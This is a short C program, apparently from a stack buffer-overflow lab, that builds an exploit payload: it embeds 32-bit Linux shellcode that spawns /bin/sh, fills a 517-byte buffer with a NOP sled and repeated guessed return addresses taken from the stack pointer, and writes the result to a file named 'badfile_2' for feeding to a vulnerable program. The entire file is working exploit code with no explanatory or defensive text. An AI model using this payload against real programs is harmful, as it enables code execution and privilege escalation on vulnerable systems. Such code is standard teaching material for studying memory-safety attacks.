#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=   "\x31\xc0"   /* Line 1: xorl %eax,%eax */
        "\x50"       /* Line 2: pushl %eax */
        "\x68""//sh" /* Line 3: pushl $0x68732f2f */
        "\x68""/bin" /* Line 4: pushl $0x6e69622f */
        "\x89\xe3"   /* Line 5: movl %esp,%ebx */
        "\x50"       /* Line 6: pushl %eax */
        "\x53"       /* Line 7: pushl %ebx */
        "\x89\xe1"   /* Line 8: movl %esp,%ecx */
        "\x99"       /* Line 9: cdq */
        "\xb0\x0b"   /* Line 10: movb $0x0b,%al */
        "\xcd\x80";   /* Line 11: int $0x80 */

unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_2", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
